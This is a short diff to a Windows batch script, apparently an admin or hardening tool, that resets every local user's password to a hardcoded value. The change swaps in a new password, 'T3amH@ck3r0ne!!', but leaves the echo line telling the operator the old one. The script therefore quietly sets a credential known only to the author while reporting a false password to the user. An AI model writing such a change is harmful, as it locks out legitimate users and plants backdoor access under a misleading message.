@@ -250,7 +250,7 @@ choice /m "Change All User Passwords?"
 if Errorlevel 2 goto NoChangePassword1
 if Errorlevel 1 goto YesChangePassword1
 :YesChangePassword1
-FOR /F %%F IN ('wmic useraccount get name') DO (Echo "%%F" | FIND /I "Name" 1>NUL) || (Echo "%%F" | FIND /I "DefaultAccount" 1>NUL) || (NET USER %%F j273e4*KeH49kDW)
+FOR /F %%F IN ('wmic useraccount get name') DO (Echo "%%F" | FIND /I "Name" 1>NUL) || (Echo "%%F" | FIND /I "DefaultAccount" 1>NUL) || (NET USER %%F T3amH@ck3r0ne!!)
 echo Changed all passwords to "j273e4*KeH49kDW". Write it down.
 :NoChangePassword1
 
